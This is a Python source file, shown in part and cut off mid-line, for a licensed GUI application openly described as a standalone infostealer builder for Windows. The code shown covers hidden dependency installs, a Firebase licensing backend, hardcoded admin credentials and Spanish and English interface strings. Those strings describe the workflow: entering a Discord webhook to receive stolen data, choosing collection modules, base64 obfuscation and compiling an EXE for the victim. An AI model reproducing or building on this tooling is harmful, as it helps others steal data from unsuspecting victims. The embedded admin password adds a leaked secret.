#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║   BRAISUDO GABBER PREMIUM  v5.3.1  -  Coded by braisudo__                  ║
║   Discord: https://discord.gg/aRPdy5sUA3                                  ║
║   FOR EDUCATIONAL PURPOSES ONLY                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import uuid
import base64
import random
import hashlib
import platform
import threading
import webbrowser
import subprocess
import shutil
import tempfile
import zipfile
import re
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path


# ============ ENTORNO ============

IS_WINDOWS = os.name == "nt"
IS_FROZEN = bool(getattr(sys, "frozen", False))
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
RUN_FLAGS = {"creationflags": CREATE_NO_WINDOW} if IS_WINDOWS else {}

DATE_FMT = "%Y-%m-%d %H:%M:%S"


def base_dir():
    try:
        if IS_FROZEN:
            return Path(sys.executable).resolve().parent
        return Path(__file__).resolve().parent
    except Exception:
        return Path.cwd()


def real_python():
    if not IS_FROZEN:
        return sys.executable
    candidates = []
    for name in ("python", "python3", "py"):
        found = shutil.which(name)
        if found:
            candidates.append(found)
    local = os.getenv("LOCALAPPDATA", "")
    for ver in ("Python314", "Python313", "Python312", "Python311",
                "Python310", "Python39"):
        candidates.append(os.path.join(local, "Programs", "Python", ver, "python.exe"))
    for root in (os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")):
        if root and os.path.isdir(root):
            try:
                for entry in sorted(os.listdir(root)):
                    if entry.lower().startswith("python"):
                        candidates.append(os.path.join(root, entry, "python.exe"))
            except Exception:
                pass
    for cand in candidates:
        if cand and os.path.exists(cand):
            return cand
    return None


def run_hidden(*args, **kwargs):
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    for key, value in RUN_FLAGS.items():
        kwargs.setdefault(key, value)
    return subprocess.run(*args, **kwargs)


# ============ DEPENDENCIAS ============

def _pip_install(*pkgs):
    try:
        exe = real_python()
        if not exe:
            return
        run_hidden([exe, '-m', 'pip', 'install', *pkgs, '-q'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


try:
    import requests
except ImportError:
    _pip_install('requests')
    import requests

try:
    import customtkinter as ctk
    import tkinter as tk
    from tkinter import messagebox, filedialog
    CTK_AVAILABLE = True
except ImportError:
    _pip_install('customtkinter')
    import customtkinter as ctk
    import tkinter as tk
    from tkinter import messagebox, filedialog
    CTK_AVAILABLE = True


# ============ CONSTANTES ============

VERSION = "5.3.1"
TOOL_NAME = "BRAISUDO GABBER PREMIUM"
AUTHOR = "braisudo__"
DISCORD = "https://discord.gg/aRPdy5sUA3"
FIREBASE_URL = "https://braisudotoolcray-default-rtdb.firebaseio.com/"

ADMIN_USER = "braisudo"
ADMIN_PASS = "casa1piso2_"

APP_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / "BraisudoGabber"
try:
    APP_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    APP_DIR = Path.cwd()

CONFIG_FILE = APP_DIR / "config.json"
SESSION_FILE = APP_DIR / "session.json"
HWID_FILE = APP_DIR / "hwid.txt"

USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,20}$")
LICENSE_ALPHABET = "ABCDEFGHJKMNPQRSTUVWXYZ23456789"

LICENSE_TYPES = ("lifetime", "monthly", "custom")
MONTHLY_DAYS = 30

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


# ============ IDIOMAS ============

STRINGS = {
    "es": {
        "app_tagline": "Constructor de infostealers\nstandalone para Windows",
        "chip_locked": "DEVICE-LOCKED", "chip_sync": "FIREBASE SYNC",
        "hwid_this": "HWID DE ESTE EQUIPO",
        "welcome_title": "ACCEDE AL TOOL",
        "welcome_sub": "Elige una opción para continuar.\nEl tool queda vinculado a este dispositivo.",
        "last_session": "ÚLTIMA SESIÓN",
        "btn_login": "  INICIAR SESIÓN  ", "btn_register": "  CREAR CUENTA  ",
        "conn_checking": "Comprobando conexión con el servidor…",
        "conn_online": "Servidor en línea · listo para entrar",
        "conn_offline": "Sin conexión con la base de datos",
        "register_title": "REGISTRO",
        "register_sub": "Crea tu cuenta y activa una licencia.\nEl equipo quedará vinculado a este usuario.",
        "login_title": "INICIAR SESIÓN",
        "login_sub": "Accede con tu cuenta. Solo funciona en el\ndispositivo donde te registraste.",
        "f_username": "USUARIO", "f_password": "CONTRASEÑA",
        "f_confirm": "REPETIR CONTRASEÑA", "f_license": "CLAVE DE LICENCIA",
        "ph_username": "3-20 caracteres · letras, números y _",
        "ph_password": "Mínimo 4 caracteres", "ph_confirm": "Vuelve a escribirla",
        "ph_license": "XXXX-XXXX-XXXX",
        "ph_login_user": "Tu nombre de usuario", "ph_login_pass": "Tu contraseña",
        "show_pass": "Mostrar contraseñas", "show_pass_s": "Mostrar contraseña",
        "match_ok": "✓  las contraseñas coinciden",
        "match_bad": "✗  las contraseñas no coinciden",
        "btn_create": "CREAR CUENTA Y CONTINUAR", "btn_enter": "ENTRAR",
        "have_account": "¿Ya tienes cuenta?", "go_login": "  INICIAR SESIÓN",
        "no_account": "¿Sin cuenta?", "go_register": "  CREAR CUENTA",
        "admin_hint": "acceso admin disponible para braisudo",
        "back_home": "←  VOLVER AL INICIO",
        "language": "IDIOMA",
        "checking": "VERIFICANDO…", "authenticating": "AUTENTICANDO…",
        "contacting": "Contactando con el servidor…",
        "verifying_admin": "Verificando credenciales de administrador…",
        "checking_creds": "Comprobando credenciales…",
        "err_user_empty": "Introduce un nombre de usuario",
        "err_user_invalid": "Usuario inválido: 3-20 caracteres, solo letras, números y _",
        "err_pass_short": "La contraseña debe tener al menos 4 caracteres",
        "err_pass_mismatch": "Las contraseñas no coinciden",
        "err_lic_empty": "Introduce una clave de licencia",
        "err_lic_short": "La clave de licencia parece demasiado corta",
        "err_fill_both": "Rellena usuario y contraseña",
        "err_no_user": "Introduce tu usuario", "err_no_pass": "Introduce tu contraseña",
        "err_exists": "El usuario '{u}' ya existe. Usa INICIAR SESIÓN.",
        "err_no_lic": "Licencia no encontrada. Revisa la clave.",
        "err_lic_revoked": "Licencia revocada.",
        "err_lic_banned": "Licencia bloqueada.",
        "err_lic_used": "Licencia ya usada por '{u}'.",
        "err_no_user_db": "No existe el usuario '{u}'",
        "err_bad_pass": "Contraseña incorrecta",
        "err_user_banned": "Tu cuenta está bloqueada por un administrador.",
        "err_other_device": "Este tool está vinculado a otro dispositivo.",
        "err_hwid_reg": "HWID registrado", "err_hwid_you": "Tu HWID",
        "err_lic_revoked_user": "Tu licencia ha sido revocada.",
        "err_lic_banned_user": "Tu licencia está bloqueada.",
        "err_lic_expired": "Tu licencia ha caducado. Contacta con un administrador.",
        "err_unexpected": "Error inesperado",
        "maint_title": "MODO MANTENIMIENTO",
        "maint_sub": "El servicio está temporalmente cerrado.\nVuelve a intentarlo en unos minutos.",
        "btn_retry": "REINTENTAR", "btn_skip": "SALTAR",
        "maint_asking": "Consultando…", "maint_still": "Sigue en mantenimiento.",
        "session_closed": "Sesión cerrada",
        "account_created": "Cuenta creada. Inicia sesión, {u}.",
        "nav_section": "  NAVEGACIÓN", "admin_section": "  ADMINISTRACIÓN",
        "nav_builder": "Builder", "nav_modules": "Módulos",
        "nav_options": "Opciones", "nav_console": "Consola", "nav_admin": "Admin",
        "topbar_sub": "standalone stealer builder",
        "badge_admin": " ADMIN ", "sub_admin": "admin · sin device-lock",
        "sub_user": "online · device-locked",
        "btn_logout": "SALIR",
        "status_ready": "✅  Listo", "status_building": "⏳  Construyendo…",
        "status_done": "✅  Build completado", "status_failed": "❌  Build fallido",
        "server_label": "SERVIDOR",
        "builder_title": "DESPLEGAR PAYLOAD",
        "builder_sub": "Introduce el webhook de Discord, elige módulos y genera tu ejecutable.",
        "f_webhook": "WEBHOOK DE DISCORD",
        "btn_test_webhook": "📡  PROBAR WEBHOOK", "btn_save": "💾  GUARDAR",
        "btn_build": "🔥   BUILD PAYLOAD", "btn_building": "⏳  CONSTRUYENDO…",
        "stat_modules": "MÓDULOS ACTIVOS", "stat_name": "NOMBRE DE SALIDA",
        "stat_mode": "MODO", "summary_title": "▸ RESUMEN RÁPIDO",
        "modules_title": "MÓDULOS DE RECOLECCIÓN",
        "modules_sub": "Pulsa una tarjeta para activarla o desactivarla.",
        "btn_enable_all": "ACTIVAR TODO", "btn_disable_all": "DESACTIVAR TODO",
        "mod_on": "ON", "mod_off": "OFF",
        "options_out": "📦  SALIDA", "f_payload_name": "NOMBRE DEL PAYLOAD",
        "f_out_dir": "CARPETA DE SALIDA", "btn_browse": "EXAMINAR",
        "options_beh": "⚙  COMPORTAMIENTO",
        "opt_obf": "Obfuscación base64", "opt_obf_sub": "Envuelve el payload en base64 + exec",
        "opt_exe": "Compilar a EXE standalone", "opt_exe_sub": "Requiere PyInstaller · tarda 1-3 min",
        "opt_rem": "Recordar usuario", "opt_rem_sub": "Rellena el login automáticamente",
        "opt_open": "Abrir carpeta al terminar", "opt_open_sub": "Abre el explorador con el EXE generado",
        "options_lang": "🌐  IDIOMA",
        "options_lang_sub": "Cambia el idioma de toda la interfaz",
        "options_adv": "▸ AVANZADO", "config_saved": "Configuración guardada en:",
        "console_title": "CONSOLA DE BUILD",
        "btn_clear": "LIMPIAR", "btn_export": "EXPORTAR",
        "admin_title": "PANEL DE ADMINISTRACIÓN",
        "admin_sub": "Genera licencias, bloquea o libera claves y gestiona usuarios.",
        "btn_refresh_all": "REFRESCAR TODO",
        "tab_generate": "GENERAR", "tab_licenses": "LICENCIAS", "tab_users": "USUARIOS",
        "gen_title": "🔑  GENERADOR DE LICENCIAS",
        "f_qty": "CANTIDAD", "f_prefix": "PREFIJO", "f_blocks": "BLOQUES", "f_len": "LONGITUD",
        "f_lic_type": "TIPO DE LICENCIA", "f_days": "DÍAS (PERSONALIZADA)",
        "lic_type_lifetime": "VITALICIA", "lic_type_month": "1 MES",
        "lic_type_custom": "PERSONALIZADA",
        "lic_badge_lifetime": " VITALICIA ", "lic_badge_month": " 1 MES ",
        "lic_badge_custom": " {n}D ",
        "btn_generate": "GENERAR", "gen_ready": "Listo para generar.",
        "gen_keys_title": "▸ CLAVES GENERADAS", "btn_copy_all": "COPIAR TODO",
        "btn_export_txt": "EXPORTAR .TXT",
        "gen_numeric_err": "Los campos numéricos son inválidos",
        "gen_qty_err": "Cantidad entre 1 y 500",
        "gen_blocks_err": "Bloques entre 1 y 5",
        "gen_len_err": "Longitud de bloque entre 3 y 8",
        "gen_days_err": "Días entre 1 y 3650",
        "gen_working": "Generando {n} claves…",
        "gen_none": "No se pudieron generar claves únicas",
        "gen_done": "✔ {n} licencias creadas ({ty})",
        "gen_none_copy": "No hay claves que copiar",
        "gen_none_exp": "No hay claves que exportar",
        "gen_copied": "Claves copiadas al portapapeles",
        "gen_exported": "Exportado a {p}",
        "btn_refresh": "REFRESCAR",
        "lic_loading": "Cargando licencias…", "usr_loading": "Cargando usuarios…",
        "lic_none": "No hay licencias todavía. Genera algunas en la pestaña GENERAR.",
        "usr_none": "Todavía no hay usuarios registrados.",
        "lic_free": "LIBRE", "lic_revoked": "REVOCADA", "lic_banned": "BANEADA",
        "lic_expired": "CADUCADA",
        "lic_used": "USADA · {u}", "lic_unknown": "DESCONOCIDO",
        "lic_no_expire": "sin caducidad", "lic_expires": "expira {d}",
        "btn_copy": "COPIAR", "btn_ban": "BANEAR", "btn_unban": "DESBANEAR",
        "btn_free": "LIBERAR", "btn_delete": "BORRAR", "btn_unbind": "LIBERAR HWID",
        "btn_renew": "RENOVAR",
        "badge_banned": " BANEADO ",
        "lic_summary": "{t} total  ·  {f} libres  ·  {u} usadas  ·  {b} baneadas  ·  {e} caducadas",
        "usr_summary": "{t} usuarios  ·  {b} baneados",
        "lic_meta": "creado {c}  ·  último login {l}",
        "lic_line": "licencia {l}  ·  hwid {h}…",
        "log_session": "Sesión iniciada como {u}",
        "log_device": "Dispositivo verificado · HWID {h}",
        "log_db": "Base de datos: {d}",
        "log_ready": "Listo. Configura el webhook y pulsa BUILD PAYLOAD.",
        "log_webhook_saved": "Webhook guardado en la configuración",
        "log_testing": "Probando webhook…", "log_webhook_ok": "Webhook OK",
        "log_webhook_http": "Webhook HTTP {c}",
        "log_webhook_err": "Webhook error: {e}",
        "log_build_start": "BUILD INICIADO", "log_webhook": "Webhook : {w}…",
        "log_name": "Nombre  : {n}", "log_mods": "Módulos : {n} activos",
        "log_opts": "Opciones: obfuscate={o} compile={c}",
        "log_generating": "Generando payload…",
        "log_payload": "Payload: {p} ({s} bytes)",
        "log_compiling": "Compilando a EXE (PyInstaller)…",
        "log_exe": "EXE: {p} ({s} bytes)",
        "log_standalone": "El EXE es standalone, no necesita Python en la víctima",
        "log_compile_fail": "La compilación falló. Revisa PyInstaller.",
        "log_build_done": "BUILD COMPLETADO",
        "log_error": "Error: {e}",
        "log_logs_exported": "Logs exportados a {p}",
        "log_export_err": "Error exportando: {e}",
        "log_admin_keys": "[ADMIN] {n} licencias generadas ({ty})",
        "log_admin_lic_ban": "[ADMIN] licencia {k} baneada",
        "log_admin_lic_unban": "[ADMIN] licencia {k} desbaneada",
        "log_admin_lic_free": "[ADMIN] licencia {k} liberada",
        "log_admin_lic_del": "[ADMIN] licencia {k} borrada",
        "log_admin_lic_renew": "[ADMIN] licencia {k} renovada",
        "log_admin_usr_ban": "[ADMIN] usuario {k} baneado",
        "log_admin_usr_unban": "[ADMIN] usuario {k} desbaneado",
        "log_admin_usr_unbind": "[ADMIN] HWID liberado para {k}",
        "log_admin_usr_del": "[ADMIN] usuario {k} borrado · licencia {l} liberada",
        "dlg_ok": "Correcto", "dlg_webhook_sent": "Webhook enviado correctamente",
        "dlg_error": "Error", "dlg_need_webhook": "Introduce un webhook primero",
        "dlg_bad_webhook": "Introduce un webhook de Discord válido",
        "dlg_bad_webhook_url": "URL de webhook de Discord inválida",
        "dlg_build_done": "Build completado",
        "dlg_build_msg": "Payload generado correctamente.\n\nPY: {p}\nID: {i}\n{exe}",
        "dlg_del_lic": "Borrar licencia", "dlg_del_lic_msg": "¿Borrar la licencia?\n\n{k}",
        "dlg_del_usr": "Borrar usuario",
        "dlg_del_usr_msg": "¿Borrar al usuario '{k}'?\n\nSu licencia también será liberada.",
        "dlg_ban_admin": "Banear admin",
        "dlg_ban_admin_msg": "Vas a banear al administrador.\nEl admin entra igual porque sus credenciales son maestras.\n\n¿Continuar?",
        "dlg_save_logs": "Guardar logs", "dlg_save_lic": "Guardar licencias",
        "dlg_pick_dir": "Selecciona la carpeta de salida",
        "txt_all": "Todos", "txt_files": "Texto",
    },
    "en": {
        "app_tagline": "Standalone infostealer\nbuilder for Windows",
        "chip_locked": "DEVICE-LOCKED", "chip_sync": "FIREBASE SYNC",
        "hwid_this": "HWID OF THIS MACHINE",
        "welcome_title": "ACCESS THE TOOL",
        "welcome_sub": "Pick an option to continue.\nThe tool is bound to this device.",
        "last_session": "LAST SESSION",
        "btn_login": "  SIGN IN  ", "btn_register": "  CREATE ACCOUNT  ",
        "conn_checking": "Checking server connection…",
        "conn_online": "Server online · ready to enter",
        "conn_offline": "No connection to the database",
        "register_title": "REGISTER",
        "register_sub": "Create your account and activate a license.\nThis machine will be bound to this user.",
        "login_title": "SIGN IN",
        "login_sub": "Log in with your account. Only works on\nthe device where you registered.",
        "f_username": "USERNAME", "f_password": "PASSWORD",
        "f_confirm": "CONFIRM PASSWORD", "f_license": "LICENSE KEY",
        "ph_username": "3-20 chars · letters, digits and _",
        "ph_password": "At least 4 characters", "ph_confirm": "Type it again",
        "ph_license": "XXXX-XXXX-XXXX",
        "ph_login_user": "Your username", "ph_login_pass": "Your password",
        "show_pass": "Show passwords", "show_pass_s": "Show password",
        "match_ok": "✓  passwords match",
        "match_bad": "✗  passwords do not match",
        "btn_create": "CREATE ACCOUNT AND CONTINUE", "btn_enter": "SIGN IN",
        "have_account": "Already have an account?", "go_login": "  SIGN IN",
        "no_account": "No account?", "go_register": "  CREATE ACCOUNT",
        "admin_hint": "admin access available for braisudo",
        "back_home": "←  BACK TO START",
        "language": "LANGUAGE",
        "checking": "CHECKING…", "authenticating": "AUTHENTICATING…",
        "contacting": "Contacting the server…",
        "verifying_admin": "Verifying administrator credentials…",
        "checking_creds": "Checking credentials…",
        "err_user_empty": "Enter a username",
        "err_user_invalid": "Invalid username: 3-20 chars, letters, digits and _ only",
        "err_pass_short": "Password must be at least 4 characters",
        "err_pass_mismatch": "Passwords do not match",
        "err_lic_empty": "Enter a license key",
        "err_lic_short": "The license key looks too short",
        "err_fill_both": "Fill in username and password",
        "err_no_user": "Enter your username", "err_no_pass": "Enter your password",
        "err_exists": "User '{u}' already exists. Use SIGN IN.",
        "err_no_lic": "License not found. Check the key.",
        "err_lic_revoked": "License revoked.",
        "err_lic_banned": "License blocked.",
        "err_lic_used": "License already used by '{u}'.",
        "err_no_user_db": "User '{u}' does not exist",
        "err_bad_pass": "Wrong password",
        "err_user_banned": "Your account is blocked by an administrator.",
        "err_other_device": "This tool is bound to another device.",
        "err_hwid_reg": "Registered HWID", "err_hwid_you": "Your HWID",
        "err_lic_revoked_user": "Your license has been revoked.",
        "err_lic_banned_user": "Your license is blocked.",
        "err_lic_expired": "Your license has expired. Contact an administrator.",
        "err_unexpected": "Unexpected error",
        "maint_title": "MAINTENANCE MODE",
        "maint_sub": "The service is temporarily closed.\nTry again in a few minutes.",
        "btn_retry": "RETRY", "btn_skip": "SKIP",
        "maint_asking": "Checking…", "maint_still": "Still under maintenance.",
        "session_closed": "Signed out",
        "account_created": "Account created. Sign in, {u}.",
        "nav_section": "  NAVIGATION", "admin_section": "  ADMINISTRATION",
        "nav_builder": "Builder", "nav_modules": "Modules",
        "nav_options": "Options", "nav_console": "Console", "nav_admin": "Admin",
        "topbar_sub": "standalone stealer builder",
        "badge_admin": " ADMIN ", "sub_admin": "admin · no device lock",
        "sub_user": "online · device-locked",
        "btn_logout": "SIGN OUT",
        "status_ready": "✅  Ready", "status_building": "⏳  Building…",
        "status_done": "✅  Build complete", "status_failed": "❌  Build failed",
        "server_label": "SERVER",
        "builder_title": "DEPLOY PAYLOAD",
        "builder_sub": "Paste the Discord webhook, pick modules and generate your executable.",
        "f_webhook": "DISCORD WEBHOOK",
        "btn_test_webhook": "📡  TEST WEBHOOK", "btn_save": "💾  SAVE",
        "btn_build": "🔥   BUILD PAYLOAD", "btn_building": "⏳  BUILDING…",
        "stat_modules": "ACTIVE MODULES", "stat_name": "OUTPUT NAME",
        "stat_mode": "MODE", "summary_title": "▸ QUICK SUMMARY",
        "modules_title": "COLLECTION MODULES",
        "modules_sub": "Click a card to enable or disable it.",
        "btn_enable_all": "ENABLE ALL", "btn_disable_all": "DISABLE ALL",
        "mod_on": "ON", "mod_off": "OFF",
        "options_out": "📦  OUTPUT", "f_payload_name": "PAYLOAD NAME",
        "f_out_dir": "OUTPUT FOLDER", "btn_browse": "BROWSE",
        "options_beh": "⚙  BEHAVIOUR",
        "opt_obf": "Base64 obfuscation", "opt_obf_sub": "Wraps the payload in base64 + exec",
        "opt_exe": "Compile to standalone EXE", "opt_exe_sub": "Needs PyInstaller · takes 1-3 min",
        "opt_rem": "Remember user", "opt_rem_sub": "Prefills the login form",
        "opt_open": "Open folder when done", "opt_open_sub": "Opens Explorer with the generated EXE",
        "options_lang": "🌐  LANGUAGE",
        "options_lang_sub": "Changes the language of the whole interface",
        "options_adv": "▸ ADVANCED", "config_saved": "Config saved at:",
        "console_title": "BUILD CONSOLE",
        "btn_clear": "CLEAR", "btn_export": "EXPORT",
        "admin_title": "ADMIN PANEL",
        "admin_sub": "Generate licenses, block or free keys and manage users.",
        "btn_refresh_all": "REFRESH ALL",
        "tab_generate": "GENERATE", "tab_licenses": "LICENSES", "tab_users": "USERS",
        "gen_title": "🔑  LICENSE GENERATOR",
        "f_qty": "QUANTITY", "f_prefix": "PREFIX", "f_blocks": "BLOCKS", "f_len": "LENGTH",
        "f_lic_type": "LICENSE TYPE", "f_days": "DAYS (CUSTOM)",
        "lic_type_lifetime": "LIFETIME", "lic_type_month": "1 MONTH",
        "lic_type_custom": "CUSTOM",
        "lic_badge_lifetime": " LIFETIME ", "lic_badge_month": " 1 MONTH ",
        "lic_badge_custom": " {n}D ",
        "btn_generate": "GENERATE", "gen_ready": "Ready to generate.",
        "gen_keys_title": "▸ GENERATED KEYS", "btn_copy_all": "COPY ALL",
        "btn_export_txt": "EXPORT .TXT",
        "gen_numeric_err": "Numeric fields are invalid",
        "gen_qty_err": "Quantity between 1 and 500",
        "gen_blocks_err": "Blocks between 1 and 5",
        "gen_len_err": "Block length between 3 and 8",
        "gen_days_err": "Days between 1 and 3650",
        "gen_working": "Generating {n} keys…",
        "gen_none": "Could not generate unique keys",
        "gen_done": "✔ {n} licenses created ({ty})",
        "gen_none_copy": "No keys to copy",
        "gen_none_exp": "No keys to export",
        "gen_copied": "Keys copied to clipboard",
        "gen_exported": "Exported to {p}",
        "btn_refresh": "REFRESH",
        "lic_loading": "Loading licenses…", "usr_loading": "Loading users…",
        "lic_none": "No licenses yet. Generate some in the GENERATE tab.",
        "usr_none": "No registered users yet.",
        "lic_free": "FREE", "lic_revoked": "REVOKED", "lic_banned": "BANNED",
        "lic_expired": "EXPIRED",
        "lic_used": "USED · {u}", "lic_unknown": "UNKNOWN",
        "lic_no_expire": "no expiry", "lic_expires": "expires {d}",
        "btn_copy": "COPY", "btn_ban": "BAN", "btn_unban": "UNBAN",
        "btn_free": "FREE", "btn_delete": "DELETE", "btn_unbind": "FREE HWID",
        "btn_renew": "RENEW",
        "badge_banned": " BANNED ",
        "lic_summary": "{t} total  ·  {f} free  ·  {u} used  ·  {b} banned  ·  {e} expired",
        "usr_summary": "{t} users  ·  {b} banned",
        "lic_meta": "created {c}  ·  last login {l}",
        "lic_line": "license {l}  ·  hwid {h}…",
        "log_session": "Session started as {u}",
        "log_device": "Device verified · HWID {h}",
        "log_db": "Database: {d}",
        "log_ready": "Ready. Set the webhook and hit BUILD PAYLOAD.",
        "log_webhook_saved": "Webhook saved to config",
        "log_testing": "Testing webhook…", "log_webhook_ok": "Webhook OK",
        "log_webhook_http": "Webhook HTTP {c}",
        "log_webhook_err": "Webhook error: {e}",
        "log_build_start": "BUILD STARTED", "log_webhook": "Webhook : {w}…",
        "log_name": "Name    : {n}", "log_mods": "Modules : {n} active",
        "log_opts": "Options : obfuscate={o} compile={c}",
        "log_generating": "Generating payload…",
        "log_payload": "Payload: {p} ({s} bytes)",
        "log_compiling": "Compiling to EXE (PyInstaller)…",
        "log_exe": "EXE: {p} ({s} bytes)",
        "log_standalone": "The EXE is standalone, no Python needed on the victim",
        "log_compile_fail": "Compilation failed. Check PyInstaller.",
        "log_build_done": "BUILD COMPLETE",
        "log_error": "Error: {e}",
        "log_logs_exported": "Logs exported to {p}",
        "log_export_err": "Export error: {e}",
        "log_admin_keys": "[ADMIN] {n} licenses generated ({ty})",
        "log_admin_lic_ban": "[ADMIN] license {k} banned",
        "log_admin_lic_unban": "[ADMIN] license {k} unbanned",
        "log_admin_lic_free": "[ADMIN] license {k} freed",
        "log_admin_lic_del": "[ADMIN] license {k} deleted",
        "log_admin_lic_renew": "[ADMIN] license {k} renewed",
        "log_admin_usr_ban": "[ADMIN] user {k} banned",
        "log_admin_usr_unban": "[ADMIN] user {k} unbanned",
        "log_admin_usr_unbind": "[ADMIN] HWID freed for {k}",
        "log_admin_usr_del": "[ADMIN] user {k} deleted · license {l} freed",
        "dlg_ok": "Success", "dlg_webhook_sent": "Webhook sent successfully",
        "dlg_error": "Error", "dlg_need_webhook": "Enter a webhook first",
        "dlg_bad_webhook": "Enter a valid Discord webhook",
        "dlg_bad_webhook_url": "Invalid Discord webhook URL",
        "dlg_build_done": "Build complete",
        "dlg_build_msg": "Payload generated successfully.\n\nPY: {p}\nID: {i}\n{exe}",
        "dlg_del_lic": "Delete license", "dlg_del_lic_msg": "Delete this license?\n\n{k}",
        "dlg_del_usr": "Delete user",
        "dlg_del_usr_msg": "Delete user '{k}'?\n\nTheir license will be freed too.",
        "dlg_ban_admin": "Ban admin",
        "dlg_ban_admin_msg": "You are about to ban the administrator.\nAdmin still gets in because the credentials are master.\n\nContinue?",
        "dlg_save_logs": "Save logs", "dlg_save_lic": "Save licenses",
        "dlg_pick_dir": "Pick the output folder",
        "txt_all": "All", "txt_files": "Text",
    },
}


class Lang:
    code = "es"

    @staticmethod
    def t(key, **kw):
        table = STRINGS.get(Lang.code) or STRINGS["es"]
        text = table.get(key) or STRINGS["es"].get(key, key)
        if kw:
            try:
                text = text.format(**kw)
            except Exception:
                pass
        return text


def t(key, **kw):
    return Lang.t(key, **kw)


def lic_type_label(ltype, duration=None):
    if ltype == "monthly":
        return t("lic_type_month")
    if ltype == "custom":
        return t("lic_type_custom")
    return t("lic_type_lifetime")


def lic_badge(ltype, duration=None):
    if ltype == "monthly":
        return t("lic_badge_month"), Theme.AMBER
    if ltype == "custom":
        return t("lic_badge_custom", n=duration or "?"), Theme.CYAN
    return t("lic_badge_lifetime"), Theme.PURPLE


def parse_dt(value):
    try:
        return datetime.strptime(str(value), DATE_FMT)
    except Exception:
        return None


def is_expired(expires):
    parsed = parse_dt(expires)
    if not parsed:
        return False
    return parsed < datetime.now()


# ============ TEMA ============

class Theme:
    BG_DEEP    = "#04060d"
    BG_PANEL   = "#070c17"
    BG_CARD    = "#0a1120"
    BG_INPUT   = "#0c1526"
    BG_HOVER   = "#101d33"
    BORDER     = "#16233d"
    BORDER_HI  = "#1f3a63"
    CYAN       = "#00e5ff"
    CYAN_DIM   = "#0a5f70"
    MAGENTA    = "#ff2bd6"
    MAGENTA_DIM= "#6d1660"
    PURPLE     = "#7c5cff"
    PURPLE_DIM = "#3a2c78"
    GREEN      = "#00ff9d"
    GREEN_DIM  = "#0a5c3d"
    RED        = "#ff4d6d"
    RED_DIM    = "#6b1f2f"
    AMBER      = "#ffb020"
    AMBER_DIM  = "#5c3f0c"
    TEXT       = "#dce9ff"
    TEXT_DIM   = "#6d81a8"
    TEXT_MUTE  = "#43536f"


FONT_TITLE = ("Segoe UI Semibold", 26, "bold")
FONT_BRAND = ("Segoe UI Semibold", 34, "bold")
FONT_H     = ("Segoe UI Semibold", 13, "bold")
FONT_BODY  = ("Segoe UI", 12)
FONT_SMALL = ("Segoe UI", 11)
FONT_TINY  = ("Segoe UI", 10)
FONT_MONO  = ("Consolas", 11